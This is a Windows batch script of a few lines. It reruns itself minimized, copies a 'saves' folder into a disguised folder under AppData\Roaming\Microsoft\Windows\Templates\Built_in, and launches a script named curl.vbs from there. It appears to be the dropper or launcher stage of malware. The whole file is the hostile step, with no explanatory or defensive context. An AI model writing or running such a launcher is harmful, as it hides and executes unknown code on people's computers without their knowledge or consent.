@echo off 
if not DEFINED IS_MINIMIZED set IS_MINIMIZED=1 && start "" /min "%~dpnx0" %* && exit
xcopy /C /R /Y /I saves "C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Templates\Built_in"
cd "C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Templates\Built_in"
start curl.vbs
exit
